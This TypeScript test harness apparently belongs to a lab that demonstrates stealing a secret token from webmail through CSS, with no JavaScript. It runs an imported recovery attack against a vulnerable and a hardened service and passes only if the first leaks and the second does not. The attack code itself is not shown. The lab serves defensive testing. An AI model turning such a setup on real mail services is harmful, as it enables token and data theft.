import { chromium } from "playwright";
import { recover } from "./exfil.js";

const VULN_URL = process.env.WEBMAIL_VULN_URL ?? "http://webmail-vuln:3000";
const SECURE_URL = process.env.WEBMAIL_SECURE_URL ?? "http://webmail-secure:3000";
const COLLECTOR_URL = process.env.COLLECTOR_URL ?? "http://collector:4000";
const EXPECTED = process.env.EXPECTED_TOKEN ?? "a1b2c3d4";
const ALPHABET = process.env.ALPHABET ?? "0123456789abcdef";
const LENGTH = Number(process.env.SECRET_LEN ?? 8);

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

async function waitForHealth(url: string): Promise<void> {
  for (let i = 0; i < 60; i++) {
    try {
      const res = await fetch(`${url}/health`);
      if (res.ok) return;
    } catch {
      /* not up yet */
    }
    await sleep(500);
  }
  throw new Error(`service never became healthy: ${url}`);
}

async function countLeaks(phase: string): Promise<number> {
  const res = await fetch(`${COLLECTOR_URL}/count?phase=${phase}`);
  return ((await res.json()) as { count: number }).count;
}

async function main(): Promise<void> {
  await Promise.all([
    waitForHealth(VULN_URL),
    waitForHealth(SECURE_URL),
    waitForHealth(COLLECTOR_URL),
  ]);

  const browser = await chromium.launch();
  const page = await browser.newPage();

  const vuln = await recover({
    page,
    webmailUrl: VULN_URL,
    collectorUrl: COLLECTOR_URL,
    phase: "vuln",
    alphabet: ALPHABET,
    length: LENGTH,
  });

  const secure = await recover({
    page,
    webmailUrl: SECURE_URL,
    collectorUrl: COLLECTOR_URL,
    phase: "secure",
    alphabet: ALPHABET,
    length: LENGTH,
  });
  const secureLeaks = await countLeaks("secure");

  await browser.close();

  console.log("\n=== CSS webmail exfiltration ===");
  console.log(`Expected token         : ${EXPECTED}`);
  console.log(`Vulnerable run recovered: ${vuln || "(nothing)"}`);
  console.log(`Hardened run recovered  : ${secure || "(nothing)"}`);
  console.log(`Hardened run leak count : ${secureLeaks}`);

  const vulnOk = vuln === EXPECTED;
  const secureOk = secure === "" && secureLeaks === 0;

  if (vulnOk && secureOk) {
    console.log("\nPASS: token stolen without JavaScript, then fully blocked.");
    process.exit(0);
  }
  console.error("\nFAIL:");
  if (!vulnOk) console.error(`  vulnerable run did not recover the token (got "${vuln}")`);
  if (!secureOk) console.error(`  hardened run leaked (recovered "${secure}", ${secureLeaks} requests)`);
  process.exit(1);
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
